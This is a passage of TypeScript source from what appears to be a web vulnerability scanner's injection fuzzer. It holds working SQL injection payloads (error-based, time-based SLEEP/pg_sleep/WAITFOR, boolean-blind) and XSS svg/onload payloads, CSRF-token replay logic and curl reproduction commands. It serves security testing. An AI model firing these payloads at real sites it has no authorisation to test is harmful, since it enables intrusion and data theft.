// Active injection fuzzing of discovered parameters — GET query parameters AND
// POST form fields the crawler mapped. Smarter than a fixed one-payload-per-param
// sweep: (1) parameters are prioritized by how injectable their names look,
// (2) XSS is reflection-guided — a benign marker is sent first, and real payloads
// only follow where it reflects, matched to the reflection context, and (3) SQLi
// tries an ordered set of context-breakers with early-exit. GET puts the payload
// in the query string; POST sends a form-encoded body carrying every discovered
// field (the injected one set to the payload, the rest to a benign filler) so
// validation that requires sibling fields still reaches the sink. Bounded by BOTH
// a request cap and a wall-clock deadline, so raising the cap never balloons scan
// time on a slow target. Every finding still carries a PROVEN receipt
// (substring-verifiable signal) that reflects the exact request — GET or POST.
import crypto from "crypto";
import { InjectableTarget } from "./crawler.js";
import { guardedFetch, safeFetch } from "./ssrf.js";
import { buildProbeEvidence, renderRawRequest } from "./evidence.js";
import { buildHeaderEvidence } from "./aggressive/aggHttp.js";
import { xssReflectionExecutes } from "./fpFilters.js";
import type { EmitFn } from "./scanEvents.js";

export interface FuzzCapture {
  url: string;
  contentType: string;
  text: string;
}

// --- Boolean-based blind SQLi oracle (pure, unit-tested) ---------------------
// Boolean-blind injection reflects nothing and doesn't sleep: the only signal is
// that a TRUE condition (AND 1=1) leaves the page as it was while a FALSE
// condition (AND 1=2) changes it. That is entirely a response-comparison
// problem, and getting the comparison wrong is how boolean-blind checks produce
// false positives — so the comparison lives here, separate and tested.

export interface CmpResponse {
  status: number;
  norm: string; // normalized body (see normalizeForComparison)
}

// Strip the volatile parts of a body so two logically-identical responses
// compare equal: scripts/styles/comments (often carry nonces/timestamps), long
// hex/token runs (ids, CSRF tokens, cache-busters), all digits, and whitespace.
// What remains is the stable structural text the boolean condition actually moves.
export function normalizeForComparison(body: string): string {
  return (body || "")
    .toLowerCase()
    .replace(/<script[\s\S]*?<\/script>/g, "")
    .replace(/<style[\s\S]*?<\/style>/g, "")
    .replace(/<!--[\s\S]*?-->/g, "")
    .replace(/[0-9a-f]{8,}/g, "")
    .replace(/\d+/g, "")
    .replace(/\s+/g, " ")
    .trim();
}

// "Same page" — same status and normalized length within 2% (min 12 chars).
export function responsesEquivalent(a: CmpResponse, b: CmpResponse): boolean {
  if (a.status !== b.status) return false;
  const la = a.norm.length, lb = b.norm.length;
  const tol = Math.max(12, Math.floor(Math.max(la, lb) * 0.02));
  return Math.abs(la - lb) <= tol;
}

// "Clearly different page" — different status, or normalized length apart by 5%+
// (min 24 chars). The gap between the 2% equivalence tolerance and this 5% floor
// is a deliberate dead zone: a response that is neither clearly the same nor
// clearly different proves nothing, and the oracle below refuses to fire on it.
export function responsesDistinct(a: CmpResponse, b: CmpResponse): boolean {
  if (a.status !== b.status) return true;
  const la = a.norm.length, lb = b.norm.length;
  const floor = Math.max(24, Math.floor(Math.max(la, lb) * 0.05));
  return Math.abs(la - lb) >= floor;
}

// The full boolean-blind proof, over two independent TRUE/FALSE pairs measured
// against a stable baseline. It fires ONLY when both TRUE conditions leave the
// page equivalent to baseline, both FALSE conditions clearly change it, the two
// FALSE responses agree with each other, and TRUE differs from FALSE. Because
// every payload carries the SAME injection syntax and differs only in the
// boolean value (1=1 vs 1=2), a page that moved purely because of the quote/
// syntax cannot pass — only the truth value can be driving the change, which is
// the definition of a boolean-blind SQL injection.
export function booleanBlindConfirmed(
  baseline: CmpResponse,
  t1: CmpResponse, f1: CmpResponse,
  t2: CmpResponse, f2: CmpResponse,
): boolean {
  return (
    responsesEquivalent(baseline, t1) &&
    responsesEquivalent(baseline, t2) &&
    responsesDistinct(baseline, f1) &&
    responsesDistinct(baseline, f2) &&
    responsesEquivalent(f1, f2) &&
    responsesDistinct(t1, f1)
  );
}

// --- Session-aware form submission (a slice of stateful scanning) ------------
// A form protected by an anti-CSRF token rejects a raw POST (typically 403), so
// every injection probe against it silently fails and its sinks go untested. The
// fuzzer fetches the form's page once, carries its session cookie forward, and
// resubmits the hidden CSRF token with each payload — so protected form sinks are
// actually reached. Falls back to today's behaviour when there is no token/cookie.

// Pull the anti-CSRF hidden token (name + value) out of a form page, if present.
// Matches the token field across the common frameworks (csrf/xsrf, Rails
// authenticity_token, Laravel _token, Django csrfmiddlewaretoken, ASP.NET
// __RequestVerificationToken); returns the FIRST such hidden input with a value.
const HIDDEN_INPUT_RE = /<input\b[^>]*?\btype\s*=\s*["']?hidden["']?[^>]*>/gi;
const TOKEN_NAME_RE = /csrf|xsrf|authenticity_token|requestverificationtoken|csrfmiddlewaretoken|^_token$/i;
export function extractHiddenToken(html: string): { name: string; value: string } | null {
  if (!html) return null;
  HIDDEN_INPUT_RE.lastIndex = 0;
  let m: RegExpExecArray | null;
  const attr = (tag: string, a: string): string | undefined => {
    const mm = new RegExp(`\\b${a}\\s*=\\s*(?:"([^"]*)"|'([^']*)'|([^\\s"'>]+))`, "i").exec(tag);
    return mm ? (mm[1] ?? mm[2] ?? mm[3]) : undefined;
  };
  while ((m = HIDDEN_INPUT_RE.exec(html)) !== null) {
    const tag = m[0];
    const name = attr(tag, "name");
    const value = attr(tag, "value");
    if (name && value && TOKEN_NAME_RE.test(name.trim())) return { name, value };
  }
  return null;
}

interface FormSession {
  cookie?: string; // "name=value; name2=value2" for the Cookie request header
  tokenName?: string;
  tokenValue?: string;
}

export async function fuzzDiscoveredTargets(
  targets: InjectableTarget[],
  fuzzHeaders: Record<string, string>,
  opts: { aggressive?: boolean; emit?: EmitFn } = {},
): Promise<{ findings: any[]; paramsTested: number; captures: FuzzCapture[] }> {
  // The aggressive tier adds four more injection classes per parameter, so it
  // gets a larger request budget and a longer wall-clock cap.
  const aggressive = !!opts.aggressive;
  const emit = opts.emit;
  // Budgets are a touch higher in aggressive mode to leave room for mined
  // (wordlist-guessed) parameters and the slow-but-bounded time-based SQLi pass.
  const MAX_REQUESTS = aggressive ? 200 : 72;
  const MAX_PARAMS_PER_TARGET = 8;
  const DEADLINE = Date.now() + (aggressive ? 40000 : 22000); // wall-clock self-cap for slow targets
  const findings: any[] = [];
  const reported = new Set<string>(); // dedupe by testName+endpoint+param
  let budget = MAX_REQUESTS;
  let paramsTested = 0;

  // Every response body this pass fetches, for cross-cutting checks that run
  // over the RESPONSE content rather than looking for an injection signature
  // (e.g. weakTokenScan.ts) — this fuzzer already exercises every discovered
  // POST endpoint, so it's the only place that ever sees these bodies at all.
  // Capped independently of MAX_REQUESTS so it can't grow unbounded even on a
  // very chatty target.
  const MAX_CAPTURES = 30;
  const captures: FuzzCapture[] = [];

  // Kept in sync with server/redTeam/sqlInjection.ts's SQL_ERROR_SIGNATURE —
  // see its comment for why the bare "near "X": syntax error"/SQLITE_ERROR
  // patterns matter: they're SQLite's actual raw Node-driver error text, not
  // the "SQLite3::"/"SQLiteException" PHP/Java class-name prefixes. Same
  // story for "syntax error at (or near|end of input)"/"unterminated quoted
  // string/identifier at or near": the RAW error text a real `pg` (node-
  // postgres) client throws, confirmed against a real local Postgres
  // instance — not the "PostgreSQL.*?ERROR"/"PG::\w*Error" wrapped forms
  // other-language drivers print.
  const sqlErrorSig =
    /(SQL syntax;|valid MySQL result|mysqli?_fetch|ORA-\d{4,5}|PLS-\d{4,5}|PostgreSQL.*?ERROR|PG::\w*Error|SQLSTATE\[|SQLite3?::|SQLiteException|SQLITE_ERROR|near \\?".*?\\?": syntax error|syntax error at (?:or near|end of input)|unterminated quoted (?:string|identifier) at or near|Unclosed quotation mark after the character string|quoted string not properly terminated|Microsoft OLE DB Provider for SQL Server|ODBC SQL Server Driver|Npgsql\.)/i;

  // LDAP filter-syntax errors. Emitted by real LDAP stacks when an unbalanced
  // filter metacharacter reaches the query. Kept tight to the raw error text /
  // library class names each stack prints, NOT the bare word "ldap" (which
  // appears in ordinary config and docs) — the FP trap the SQL sig comment warns of.
  const ldapErrorSig =
    /(javax\.naming\.(?:directory\.)?(?:InvalidSearchFilterException|NamingException)|com\.sun\.jndi\.ldap|LDAPException|ldap_(?:search|bind|list|read|modify|add|compare)\(\)|Bad search filter|Invalid (?:DN syntax|search filter)|System\.DirectoryServices|DirectoryServicesCOMException|ldap\.(?:FILTER_ERROR|INVALID_SYNTAX|OPERATIONS_ERROR|PROTOCOL_ERROR)|Protocol error occurred|supplied argument is not a valid ldap)/i;

  // XPath expression errors. Emitted by XML/XPath engines when an unbalanced
  // quote breaks an XPath string literal. Tight to error text / engine class
  // names — never the bare word "xpath", which is common in legitimate copy.
  const xpathErrorSig =
    /(XPath(?:Exception|EvalError|ExpressionException)|xmlXPathEval|SimpleXMLElement::xpath|System\.Xml\.XPath|net\.sf\.saxon|org\.apache\.xpath|lxml\.etree\.XPath|Invalid (?:XPath )?(?:expression|predicate)|A closing bracket expected|Expression must evaluate to a node-?set|MS ?XML|msxml\d)/i;

  const buildUrl = (base: string, param: string, value: string): string => {
    const u = new URL(base);
    u.searchParams.set(param, value);
    return u.toString();
  };

  const probe = async (target: string): Promise<{ res: Response; text: string }> => {
    const ctl = new AbortController();
    const id = setTimeout(() => ctl.abort(), 4000);
    try {
      const res = await safeFetch(target, { headers: sessionHeaders(), signal: ctl.signal });
      return { res, text: await res.text() };
    } finally {
      clearTimeout(id);
    }
  };
  // Raw request that does NOT follow redirects, so a 3xx and its headers are
  // returned intact — needed for the open-redirect and CRLF header proofs (see
  // aggressive/aggHttp.aggFetchRaw for the same reasoning).
  const probeRaw = async (target: string): Promise<Response> => {
    const ctl = new AbortController();
    const id = setTimeout(() => ctl.abort(), 4000);
    try {
      return await guardedFetch(target, { headers: sessionHeaders(), redirect: "manual", signal: ctl.signal });
    } finally {
      clearTimeout(id);
    }
  };
  const canSpend = () => budget > 0 && Date.now() < DEADLINE;

  // Form-encoded POST body carrying every discovered field: the injected field
  // holds the payload, the rest a benign filler, so endpoints that validate the
  // presence of sibling fields still process our value. The injected field is
  // guaranteed present even if it wasn't in the discovered list.
  // The session for the target currently being fuzzed: its carried cookie and
  // the CSRF token to resubmit. Set once per target in the dispatch loop below;
  // stays {} for GET/query targets and for forms with no token/session, so the
  // request shape is byte-for-byte what it was before when there's nothing to add.
  let activeSession: FormSession = {};

  // A field's value in a POST body: the injected payload wins; the carried CSRF
  // token keeps its real value (filler would fail the token check); everything
  // else is benign filler so sibling-field validation still passes.
  const FILLER = "seclayer";
  const fieldValue = (p: string, injectParam: string, value: string): string =>
    p === injectParam ? value : (p === activeSession.tokenName && activeSession.tokenValue != null ? activeSession.tokenValue : FILLER);
  const formBody = (allParams: string[], injectParam: string, value: string): string => {
    const usp = new URLSearchParams();
    let names = allParams.includes(injectParam) ? allParams : [...allParams, injectParam];
    if (activeSession.tokenName && !names.includes(activeSession.tokenName)) names = [...names, activeSession.tokenName];
    for (const p of names) usp.set(p, fieldValue(p, injectParam, value));
    return usp.toString();
  };
  // JSON body carrying every field (injected one = payload, rest = filler), for
  // API endpoints that only accept application/json rather than a form body. The
  // response-side proofs (error signature / reflection / timing) are body-agnostic,
  // so every probe below works identically over a JSON POST.
  const jsonBody = (allParams: string[], injectParam: string, value: string): string => {
    const obj: Record<string, string> = {};
    let names = allParams.includes(injectParam) ? allParams : [...allParams, injectParam];
    if (activeSession.tokenName && !names.includes(activeSession.tokenName)) names = [...names, activeSession.tokenName];
    for (const p of names) obj[p] = fieldValue(p, injectParam, value);
    return JSON.stringify(obj);
  };
  // Request headers for the target being fuzzed, adding the carried session
  // Cookie when there is one. renderRawRequest redacts Cookie in receipts.
  const sessionHeaders = (): Record<string, string> =>
    activeSession.cookie ? { ...fuzzHeaders, Cookie: activeSession.cookie } : fuzzHeaders;
  const postContentType = (t: InjectableTarget): string =>
    t.contentType === "json" ? "application/json" : "application/x-www-form-urlencoded";
  const postBody = (t: InjectableTarget, param: string, value: string): string =>
    t.contentType === "json" ? jsonBody(t.params, param, value) : formBody(t.params, param, value);

  // A single (param=value) injection sent with the target's own method. Returns
  // the exchange plus the exact request shape, so the PROVEN receipt shows the
  // real GET or POST. The response-side proof (signal.quote appearing in the
  // body) is identical for both, so every probe below is method-agnostic.
  type Sent = {
    res: Response;
    text: string;
    attackUrl: string;
    reqMethod: "GET" | "POST";
    reqBody?: string;
    reqContentType?: string;
  };
  const captureResponse = (url: string, res: Response, text: string): void => {
    if (captures.length >= MAX_CAPTURES) return;
    captures.push({ url, contentType: res.headers.get("content-type") || "", text: text.slice(0, 100_000) });
  };

  const sendInjection = async (t: InjectableTarget, param: string, value: string): Promise<Sent> => {
    if (t.method === "POST") {
      const body = postBody(t, param, value);
      const contentType = postContentType(t);
      const ctl = new AbortController();
      const id = setTimeout(() => ctl.abort(), 4000);
      try {
        const res = await safeFetch(t.url, {
          method: "POST",
          headers: { ...sessionHeaders(), "Content-Type": contentType },
          body,
          signal: ctl.signal,
        });
        const text = await res.text();
        captureResponse(t.url, res, text);
        return { res, text, attackUrl: t.url, reqMethod: "POST", reqBody: body, reqContentType: contentType };
      } finally {
        clearTimeout(id);
      }
    }
    const url = buildUrl(t.url, param, value);
    const { res, text } = await probe(url);
    captureResponse(url, res, text);
    return { res, text, attackUrl: url, reqMethod: "GET" };
  };

  // A single injection sent purely to MEASURE RESPONSE TIME (for the time-based
  // blind SQLi oracle). Longer timeout than the signal probes so a legitimate
  // multi-second SQL sleep can complete. Returns whether the request actually
  // finished (ok=false on abort/error) so a hung/aborted request is never
  // mistaken for a slept response.
  const sendTimed = async (
    t: InjectableTarget,
    param: string,
    value: string,
    timeoutMs: number,
  ): Promise<{ elapsed: number; ok: boolean }> => {
    const start = Date.now();
    const ctl = new AbortController();
    const id = setTimeout(() => ctl.abort(), timeoutMs);
    try {
      if (t.method === "POST") {
        const res = await safeFetch(t.url, {
          method: "POST",
          headers: { ...sessionHeaders(), "Content-Type": postContentType(t) },
          body: postBody(t, param, value),
          signal: ctl.signal,
        });
        await res.text().catch(() => "");
      } else {
        const res = await safeFetch(buildUrl(t.url, param, value), { headers: sessionHeaders(), signal: ctl.signal });
        await res.text().catch(() => "");
      }
      return { elapsed: Date.now() - start, ok: true };
    } catch {
      return { elapsed: Date.now() - start, ok: false };
    } finally {
      clearTimeout(id);
    }
  };

  // SQL context-breakers, ordered by error-provoking yield. A bare unbalanced
  // quote/paren is the highest-signal error trigger (an "' OR 1=1-- -" often
  // produces VALID sql and no error); these cover single-quote, double-quote and
  // parenthesised contexts a single classic payload misses. First DB error wins.
  const SQL_BREAKERS = ["'", '"', "')", "' OR 1=1-- -"];

  // Rank an injection class by how much the parameter name suggests it, so the
  // budget is spent on the likeliest wins first.
  const classify = (name: string): { sqli: number; xss: number } => {
    const n = name.toLowerCase();
    let sqli = 1, xss = 1;
    if (/(^|_)(id|uid|pid|oid)($|_)/.test(n) || /\b(order|orderby|sort|user|account|record|row|num|count|cat|category|group|filter|page|offset|limit|col|column|table|field|key)\b/.test(n) || /id$/.test(n)) sqli += 2;
    if (/\b(q|s|query|search|term|keyword|name|title|comment|message|msg|desc|description|text|content|body|feedback|subject|label|note|tag|author|city|address|return|redirect|next|url)\b/.test(n)) xss += 2;
    return { sqli, xss };
  };

  type XssCtx = "attr" | "script" | "html";
  const xssForContext = (ctx: XssCtx, token: string): string =>
    ctx === "attr" ? `"><svg/onload=${token}>`
      : ctx === "script" ? `</script><svg/onload=${token}>`
      : `<svg/onload=${token}>`;
  // Guess the reflection context from the bytes just before the reflected marker.
  const reflectionContext = (body: string, idx: number): XssCtx => {
    const before = body.slice(Math.max(0, idx - 240), idx).toLowerCase();
    if (before.lastIndexOf("<script") > before.lastIndexOf("</script")) return "script";
    if (before.lastIndexOf("<") > before.lastIndexOf(">")) return "attr"; // inside an open tag's attribute
    return "html";
  };

  // --- per-class probes (each pushes a PROVEN finding on success) ---
  const trySqli = async (t: InjectableTarget, param: string, endpointPath: string): Promise<void> => {
    const key = `sqli:${endpointPath}:${param}`;
    if (reported.has(key)) return;
    for (const breaker of SQL_BREAKERS) {
      if (!canSpend()) return;
      budget--;
      try {
        const sent = await sendInjection(t, param, breaker);
        const m = sqlErrorSig.exec(sent.text);
        if (m) {
          // Differential guard against false positives: confirm a benign value
          // for this parameter doesn't already produce the same DB error. If it
          // does, the error is inherent page content, not injection — suppress.
          // Only runs on a match (rare), so it doesn't inflate the request budget.
          budget--;
          const baseText = await sendInjection(t, param, "seclayer1").then((s) => s.text).catch(() => "");
          if (sqlErrorSig.test(baseText)) return; // inherent error → not a finding
          reported.add(key);
          findings.push({
            // Includes the param + endpoint so two distinct vulnerable
            // endpoints never share a title — compileStaticFindings' final
            // dedup step keys on title alone, and a fixed generic title here
            // used to make it silently drop every SQLi finding after the first.
            testName: `SQL Injection (discovered parameter "${param}" on ${endpointPath})`,
            payload: `${param}=${breaker}`,
            severity: "critical",
            description: `Injecting SQL metacharacters into the discovered ${sent.reqMethod} parameter "${param}" on ${endpointPath} provoked a database error, indicating an exploitable SQL injection.`,
            fix: "Use parameterized queries / prepared statements for this endpoint; never concatenate request input into SQL.",
            evidence: buildProbeEvidence({
              method: "error-signature", attackUrl: sent.attackUrl, requestHeaders: sessionHeaders(), res: sent.res, body: sent.text,
              matchIndex: m.index, quote: m[0],
              reqMethod: sent.reqMethod, reqBody: sent.reqBody, reqContentType: sent.reqContentType,
              why: `This raw database error is emitted only when the injected payload breaks the SQL query's syntax, proving the "${param}" parameter reaches the database unescaped.`,
              demonstration: `We injected ${breaker} into the "${param}" ${sent.reqMethod} parameter on ${endpointPath} and the server returned a raw database error — proof that this parameter's value is concatenated into a SQL query unescaped.`,
            }),
          });
          return; // early-exit: confirmed for this param
        }
      } catch { /* probe failed */ }
    }
  };

  // Time-based BLIND SQLi. When an app suppresses DB errors and reflects nothing,
  // the error/reflection probes above miss real injection. This measures a
  // differential: a benign value returns fast; a payload that makes the DB
  // sleep(N) delays the response by ~N seconds. To rule out a merely slow/flaky
  // endpoint, the delay must SCALE with the injected seconds (a 4s sleep is
  // clearly slower than a 1s sleep, both slower than baseline) — a fixed backend
  // latency delays every request equally and so fails this test. No inline
  // receipt: the proof is the timing, not a captured byte.
  const TIME_DELAY = 4; // seconds the injection asks the DB to sleep
  const TIME_CONFIRM = 1; // shorter sleep for the scaling confirmation
  const TIME_TIMEOUT = 8000; // must exceed TIME_DELAY*1000 with headroom
  const TIME_DIALECTS: Array<{ probe: string; confirm: string }> = [
    { probe: `1' AND SLEEP(${TIME_DELAY})-- -`, confirm: `1' AND SLEEP(${TIME_CONFIRM})-- -` },
    { probe: `1') AND SLEEP(${TIME_DELAY})-- -`, confirm: `1') AND SLEEP(${TIME_CONFIRM})-- -` },
    { probe: `1 AND SLEEP(${TIME_DELAY})`, confirm: `1 AND SLEEP(${TIME_CONFIRM})` },
    { probe: `1'||pg_sleep(${TIME_DELAY})||'`, confirm: `1'||pg_sleep(${TIME_CONFIRM})||'` },
    { probe: `1'; WAITFOR DELAY '0:0:${TIME_DELAY}'-- -`, confirm: `1'; WAITFOR DELAY '0:0:${TIME_CONFIRM}'-- -` },
  ];
  const tryTimeSqli = async (t: InjectableTarget, param: string, endpointPath: string): Promise<void> => {
    const key = `timesqli:${endpointPath}:${param}`;
    // Skip if this param already has an (error-based) SQLi finding, or no budget.
    if (reported.has(key) || reported.has(`sqli:${endpointPath}:${param}`) || !canSpend()) return;

    // Baseline. Bail on an already-slow endpoint, where jitter would swamp the
    // timing signal and risk a false positive.
    budget--;
    const base = await sendTimed(t, param, "1", TIME_TIMEOUT);
    if (!base.ok || base.elapsed > 2500) return;
    const baseline = base.elapsed;

    for (const { probe: probePayload, confirm: confirmPayload } of TIME_DIALECTS) {
      if (!canSpend()) return;
      budget--;
      const hit = await sendTimed(t, param, probePayload, TIME_TIMEOUT);
      // A clear ~TIME_DELAY-second delay beyond baseline (0.6 factor absorbs the
      // sleep being inexact plus normal response time).
      if (!hit.ok || hit.elapsed - baseline < TIME_DELAY * 1000 * 0.6) continue;

      // Scaling confirmation: the short sleep must land clearly between baseline
      // and the long sleep. Fixed latency delays both equally and fails here.
      if (!canSpend()) return;
      budget--;
      const confirm = await sendTimed(t, param, confirmPayload, TIME_TIMEOUT);
      if (!confirm.ok) continue;
      const scaled =
        hit.elapsed - confirm.elapsed >= (TIME_DELAY - TIME_CONFIRM) * 1000 * 0.5 &&
        confirm.elapsed - baseline >= TIME_CONFIRM * 1000 * 0.4;
      if (!scaled) continue;

      reported.add(key);
      // The proof is the timing, not a reflected string, so there is no quote to
      // highlight (signal.quote stays empty → isProven is false → this is a
      // CONFIRMED differential, not PROVEN). The receipt shows the benign
      // baseline exchange and the injected-sleep exchange with their measured
      // latencies, so the scaling proof is replayable.
      const benignUrl = t.method === "POST" ? t.url : buildUrl(t.url, param, "1");
      const sleepUrl = t.method === "POST" ? t.url : buildUrl(t.url, param, probePayload);
      const reqOf = (value: string, u: string) =>
        t.method === "POST"
          ? renderRawRequest("POST", u, { ...sessionHeaders(), "Content-Type": postContentType(t) }, postBody(t, param, value))
          : renderRawRequest("GET", u, sessionHeaders());
      findings.push({
        testName: `SQL Injection — time-based blind (discovered parameter "${param}" on ${endpointPath})`,
        payload: `${param}=${probePayload}`,
        severity: "critical",
        description: `A time-based blind SQL injection was confirmed on the ${t.method} parameter "${param}" at ${endpointPath}. A benign value returned in ~${baseline}ms, an injected ${TIME_DELAY}s database sleep delayed the response to ~${hit.elapsed}ms, and a ${TIME_CONFIRM}s sleep to ~${confirm.elapsed}ms — the response time tracks the injected delay, proving "${param}" is concatenated into a SQL query executed on the database even though nothing is reflected in the response.`,
        fix: "Use parameterized queries / prepared statements for this endpoint; never concatenate request input into SQL. A time-based blind injection is fully exploitable to extract data one query at a time.",
        evidence: {
          method: "differential",
          baseline: { identity: "benign", request: reqOf("1", benignUrl), response: `HTTP/1.1 ${base.ok ? "200" : "—"} — responded in ~${baseline}ms (benign value)` },
          attack: { identity: "injected", request: reqOf(probePayload, sleepUrl), response: `HTTP/1.1 200 — responded in ~${hit.elapsed}ms after an injected ${TIME_DELAY}s SLEEP; a ${TIME_CONFIRM}s SLEEP gave ~${confirm.elapsed}ms` },
          signal: { quote: "", offsetInResponse: 0, why: `Response latency tracks the injected delay (baseline ~${baseline}ms → ${TIME_CONFIRM}s sleep ~${confirm.elapsed}ms → ${TIME_DELAY}s sleep ~${hit.elapsed}ms), which only happens if "${param}" reaches the SQL engine. Timing is the proof, so there is no reflected string to quote.` },
          demonstration: `The response time scaled with an injected database sleep — ~${baseline}ms normally, ~${hit.elapsed}ms with a ${TIME_DELAY}s sleep — so "${param}" is executed as SQL even though nothing is echoed back.`,
          reproduction: t.method === "POST"
            ? `curl -sk -o /dev/null -w "%{time_total}s\\n" -X POST "${t.url}" --data '${postBody(t, param, probePayload)}'`
            : `curl -sk -o /dev/null -w "%{time_total}s\\n" "${sleepUrl}"`,
          capturedAt: new Date().toISOString(),
        },
      });
      return;
    }
  };

  // Boolean-based BLIND SQLi. The complement to time-based: when an app
  // suppresses errors, reflects nothing AND doesn't sleep, the only tell is that
  // a TRUE condition leaves the page unchanged while a FALSE condition changes
  // it. Every payload carries the SAME injection syntax and differs only in the
  // boolean value (1=1 vs 1=2), confirmed over two independent pairs against a
  // stability-checked baseline, so nothing but the truth value can move the page.
  // No inline receipt: the proof is the differential, not a captured byte.
  const BOOL_DIALECTS: Array<{ t1: string; f1: string; t2: string; f2: string }> = [
    { t1: "1' AND 1=1-- -", f1: "1' AND 1=2-- -", t2: "1' AND 7=7-- -", f2: "1' AND 7=8-- -" },
    { t1: "1') AND 1=1-- -", f1: "1') AND 1=2-- -", t2: "1') AND 7=7-- -", f2: "1') AND 7=8-- -" },
    { t1: "1 AND 1=1", f1: "1 AND 1=2", t2: "1 AND 7=7", f2: "1 AND 7=8" },
    { t1: '1" AND 1=1-- -', f1: '1" AND 1=2-- -', t2: '1" AND 7=7-- -', f2: '1" AND 7=8-- -' },
  ];
  const tryBooleanSqli = async (t: InjectableTarget, param: string, endpointPath: string): Promise<void> => {
    const key = `boolsqli:${endpointPath}:${param}`;
    // Skip if any other SQLi class already fired for this param, or no budget.
    if (reported.has(key) || reported.has(`sqli:${endpointPath}:${param}`) ||
        reported.has(`timesqli:${endpointPath}:${param}`) || !canSpend()) return;

    const cmp = (sent: { res: Response; text: string }): CmpResponse => ({ status: sent.res.status, norm: normalizeForComparison(sent.text) });

    // Stability guard: two identical baseline requests must agree, or the page is
    // too volatile for a boolean comparison to mean anything (rules out FPs on
    // pages with rotating content the normalizer doesn't catch).
    budget--;
    const b1 = await sendInjection(t, param, "1").catch(() => null);
    if (!b1 || !canSpend()) return;
    budget--;
    const b2 = await sendInjection(t, param, "1").catch(() => null);
    if (!b2) return;
    const base = cmp(b1);
    if (!responsesEquivalent(base, cmp(b2))) return;

    for (const d of BOOL_DIALECTS) {
      if (!canSpend()) return;
      budget--;
      const st1 = await sendInjection(t, param, d.t1).catch(() => null);
      if (!st1 || !canSpend()) { if (!st1) continue; return; }
      budget--;
      const sf1 = await sendInjection(t, param, d.f1).catch(() => null);
      if (!sf1) continue;
      // Cheap pre-check before spending the confirmation pair.
      if (!(responsesEquivalent(base, cmp(st1)) && responsesDistinct(base, cmp(sf1)))) continue;
      if (!canSpend()) return;
      budget--;
      const st2 = await sendInjection(t, param, d.t2).catch(() => null);
      if (!st2 || !canSpend()) { if (!st2) continue; return; }
      budget--;
      const sf2 = await sendInjection(t, param, d.f2).catch(() => null);
      if (!sf2) continue;

      if (!booleanBlindConfirmed(base, cmp(st1), cmp(sf1), cmp(st2), cmp(sf2))) continue;

      reported.add(key);
      const trueUrl = t.method === "POST" ? t.url : buildUrl(t.url, param, d.t1);
      const falseUrl = t.method === "POST" ? t.url : buildUrl(t.url, param, d.f1);
      const reqOf = (value: string, u: string) =>
        t.method === "POST"
          ? renderRawRequest("POST", u, { ...sessionHeaders(), "Content-Type": postContentType(t) }, postBody(t, param, value))
          : renderRawRequest("GET", u, sessionHeaders());
      findings.push({
        testName: `SQL Injection — boolean-based blind (discovered parameter "${param}" on ${endpointPath})`,
        payload: `${param}=${d.f1}`,
        severity: "critical",
        description: `A boolean-based blind SQL injection was confirmed on the ${t.method} parameter "${param}" at ${endpointPath}. A TRUE condition ("${d.t1}") returned the same page as a benign value while a FALSE condition ("${d.f1}") returned a clearly different page — reproduced with a second independent condition pair. Both payloads carry identical syntax and differ only in the boolean value, so the page content is controlled by a SQL condition the parameter is concatenated into, even though nothing is reflected and no database error is shown.`,
        fix: "Use parameterized queries / prepared statements for this endpoint; never concatenate request input into SQL. A boolean-based blind injection is fully exploitable to extract data one bit at a time.",
        evidence: {
          method: "differential",
          baseline: { identity: "true-condition", request: reqOf(d.t1, trueUrl), response: `HTTP/1.1 ${cmp(st1).status} — page equivalent to the benign baseline (normalized length ~${cmp(st1).norm.length})` },
          attack: { identity: "false-condition", request: reqOf(d.f1, falseUrl), response: `HTTP/1.1 ${cmp(sf1).status} — page clearly changed (normalized length ~${cmp(sf1).norm.length}); reproduced with ${d.t2} / ${d.f2}` },
          signal: { quote: "", offsetInResponse: 0, why: `TRUE (${d.t1}) matched the baseline and FALSE (${d.f1}) diverged, over two independent condition pairs, while the injection syntax stayed identical — only the boolean truth value moved the page, which is boolean-blind SQLi. The proof is the differential, so there is no reflected string to quote.` },
          demonstration: `A true SQL condition left "${param}" on ${endpointPath} rendering normally; a false one changed the page — proof the value is evaluated as SQL even though nothing is echoed back.`,
          reproduction: t.method === "POST"
            ? `curl -sk "${t.url}" --data '${postBody(t, param, d.t1)}'   # vs --data '${postBody(t, param, d.f1)}'`
            : `curl -sk "${trueUrl}"   # vs   "${falseUrl}"`,
          capturedAt: new Date().toISOString(),
        },
      });
      return;
    }
  };

  const tryXss = async (t: InjectableTarget, param: string, endpointPath: string): Promise<void> => {
    const key = `xss:${endpointPath}:${param}`;
    if (reported.has(key) || !canSpend()) return;
    // Reflection-guided: send a benign marker first; only fuzz XSS where it lands.
    budget--;
    let ctx: XssCtx | null = null;
    try {
      const marker = `zq${crypto.randomBytes(4).toString("hex")}`;
      const { text } = await sendInjection(t, param, marker);
      const mi = text.indexOf(marker);
      if (mi !== -1) ctx = reflectionContext(text, mi);
    } catch { /* skip */ }
    if (!ctx) return; // no reflection → don't waste requests here

    // Try the context-matched payload, then an HTML fallback; verify unescaped.
    const contexts: XssCtx[] = ctx === "html" ? ["html"] : [ctx, "html"];
    for (const c of contexts) {
      if (!canSpend()) return;
      budget--;
      const token = `sx${crypto.randomBytes(4).toString("hex")}`;
      const payload = xssForContext(c, token);
      try {
        const sent = await sendInjection(t, param, payload);
        const idx = sent.text.indexOf(payload);
        // Verbatim reflection is confirmed, but still require the response to be
        // browser-parsed HTML and the payload to land in an executing context —
        // a non-HTML body or a comment/<textarea>/<title> reflection is inert.
        if (idx !== -1 && xssReflectionExecutes(sent.res.headers.get("content-type"), sent.text, idx)) {
          reported.add(key);
          findings.push({
            // Same reasoning as the SQLi finding above: the param + endpoint
            // must be in the title, not just the description, or two distinct
            // reflected-XSS endpoints collide under the title-based dedup.
            testName: `Reflected XSS (discovered parameter "${param}" on ${endpointPath})`,
            payload: `${param}=${payload}`,
            severity: "high",
            description: `The discovered ${sent.reqMethod} parameter "${param}" on ${endpointPath} reflects unencoded HTML/JavaScript into the response, confirming a reflected Cross-Site Scripting vulnerability.`,
            fix: "Apply context-aware output encoding for this parameter and deploy a restrictive Content-Security-Policy.",
            evidence: buildProbeEvidence({
              method: "reflection", attackUrl: sent.attackUrl, requestHeaders: sessionHeaders(), res: sent.res, body: sent.text,
              matchIndex: idx, quote: payload,
              reqMethod: sent.reqMethod, reqBody: sent.reqBody, reqContentType: sent.reqContentType,
              why: `The payload was reflected verbatim and unescaped in ${c === "attr" ? "an attribute" : c === "script" ? "a script" : "an HTML"} context, so a browser executes the injected "${param}" value as live markup.`,
